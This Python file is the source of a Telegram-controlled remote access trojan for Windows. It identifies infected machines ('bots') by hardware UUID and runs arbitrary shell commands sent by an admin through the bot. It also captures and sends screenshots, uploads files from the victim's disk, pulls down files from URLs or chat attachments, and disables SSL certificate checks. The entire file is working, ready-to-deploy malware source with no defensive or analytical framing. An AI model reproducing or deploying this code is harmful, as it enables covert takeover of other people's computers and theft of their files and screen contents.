# -*- coding: utf-8 -*-

from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, InlineQueryHandler
from telegram import InlineQueryResultArticle, ChatAction, InputTextMessageContent
from uuid import uuid4
import subprocess
import time
import datetime
import logging
import urllib
import ssl
import tempfile
import os
from PIL import ImageGrab
ssl._create_default_https_context = ssl._create_unverified_context


## BOT API KEY Ex: [123456789:SDF8904J55WCJ79458NWF5NF3F55)]
bot_api = "PASTE KEY HERE"
## Admin ID Ex: 12345678
ADMIN = "12345678"
listen = False


logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)


updater = Updater(token=bot_api)
dispatcher = updater.dispatcher



def helpmenu(bot, update):
    if listening():
        bot.sendMessage(chat_id=update.message.chat_id,
                            text='''/online - List all online bots
                                    /exit - exit this session
                                    /use - [UUID] start session


                                    # use [uuid] [COMMAND] [args]
                                    /help - This menu 
                                    /screenshot - Take a screenshot and upload
                                    /upload - [local path] Upload file to chat
                                    #download - To send files just grag and drop files to Bot! (:
                                    #execute ''', parse_mode="Markdown")
    else:
        bot.sendMessage(chat_id=update.message.chat_id,
                            text='''/online - List all online bots [UUID]
                                    /use [UUID] - List all online bots
                                    /help - This menu''', parse_mode="Markdown")


def download(bot, update):
    location = tempfile.gettempdir()+'\\file.'+update.message.text.split('.')[-1]
    urllib.request.urlretrieve(update.message.text.split(' ')[-1], location)
    bot.sendMessage(chat_id=update.message.chat_id,
                        text='The file has been downloaded to: '+location, parse_mode="Markdown")


def online(bot, update):
    bot.sendChatAction(chat_id=update.message.chat_id,
                       action=ChatAction.TYPING)
    if update.message.from_user.id != int(ADMIN):
        bot.sendChatAction(chat_id=update.message.chat_id,
                           action=ChatAction.TYPING)
        time.sleep(1)
        bot.sendMessage(chat_id=update.message.chat_id,
                        text="No Access :(")
        bot.sendChatAction(chat_id=update.message.chat_id,
                           action=ChatAction.TYPING)
    else:
        bot.sendChatAction(chat_id=update.message.chat_id,
                           action=ChatAction.TYPING)
        bot.sendMessage(chat_id=update.message.chat_id, text=getUUID())


def getUUID():
    uuid = str(subprocess.check_output('wmic csproduct get uuid').split()[1])
    return str(repr(uuid).split("'")[1])

def execute(bot, update, direct=True):
    try:
        user_id = update.message.from_user.id
        command = update.message.text
        inline = False
    except AttributeError:
        # Using inline
        user_id = update.inline_query.from_user.id
        command = update.inline_query.query
        inline = True
    if int(user_id) == int(ADMIN) and  listening():
        if not inline:
            bot.sendChatAction(chat_id=update.message.chat_id,
                               action=ChatAction.TYPING)
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output = output.stdout.read().decode('utf-8')
        output = '`{0}`'.format(output)

        if not inline:
            bot.sendMessage(chat_id=update.message.chat_id,
                        text=output, parse_mode="Markdown")
            return False

        if inline:
            return output


def inlinequery(bot, update):
    query = update.inline_query.query
    o = execute(query, update, direct=False)
    results = list()

    results.append(InlineQueryResultArticle(id=uuid4(),
                                            title='EDIT',
                                            description=o,
                                            input_message_content=InputTextMessageContent(
                                                '*{0}*\n\n{1}'.format(query, o),
                                                parse_mode="Markdown")))

    bot.answerInlineQuery(update.inline_query.id, results=results, cache_time=10)




def screenshot(bot, update):
    if listening():
        ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        scr_img = ImageGrab.grab()
        scr_img.save(str(ts) + '.png')
        bot.sendPhoto(chat_id=update.message.chat_id, photo=open(ts+'.png','rb'),caption="Screen capture:")
        os.remove(str(ts) + '.png')


def upload(bot, update):
    if listening():
        command = update.message.text.split(' ')[-1]
        bot.sendDocument(chat_id=update.message.chat_id, document=open(command,'r'),caption="File uploaded:")


def documentDownload(bot, update):
    if listening():
        file_id = update.message.document.file_id
        file_name = update.message.document.file_name
        newFile = bot.getFile(file_id)
        newFile.download(file_name)
        bot.sendMessage(chat_id=update.message.chat_id, text= file_name + " downloaded succesfully!")


def error(bot, update, error):
    bot.sendMessage(chat_id=update.message.chat_id,text='LOG: () Update "%s" caused error "%s"' % (update, error), parse_mode="Markdown")
    return

def exitSession(bot, update):
    set_listening(False)
    bot.sendMessage(chat_id=update.message.chat_id,
        text='Gone Back to wild..**')

def startSession(bot, update):
    if len(update.message.text)>0:
        command = update.message.text
        if getUUID() in command:
            set_listening(True)
            bot.sendMessage(chat_id=update.message.chat_id,text='%s Listening' % (getUUID()))
    else:
        bot.sendMessage(chat_id=update.message.chat_id,text='/use [UUID]')


def listening():
    return listen

def falsefunction():
    return False

def set_listening(status):
    global listen
    listen = status



execute_handler = MessageHandler([Filters.text], execute)
document_handler = MessageHandler([Filters.document], documentDownload)
screen_handler = CommandHandler('screenshot', screenshot)
dispatcher.add_handler(screen_handler)
upload_handler = CommandHandler('upload', upload)
dispatcher.add_handler(execute_handler)
dispatcher.add_handler(upload_handler)
dispatcher.add_handler(document_handler)


help_handler = CommandHandler('help', helpmenu)
dispatcher.add_handler(help_handler)

online_handler = CommandHandler('online', online)
dispatcher.add_handler(online_handler)

use_handler = CommandHandler('use', startSession)
dispatcher.add_handler(use_handler)

exit_handler = CommandHandler('exit', exitSession)
dispatcher.add_handler(exit_handler)

# dispatcher.add_handler(InlineQueryHandler(inlinequery))
# dispatcher.add_error_handler(error)

updater.start_polling()
updater.idle()
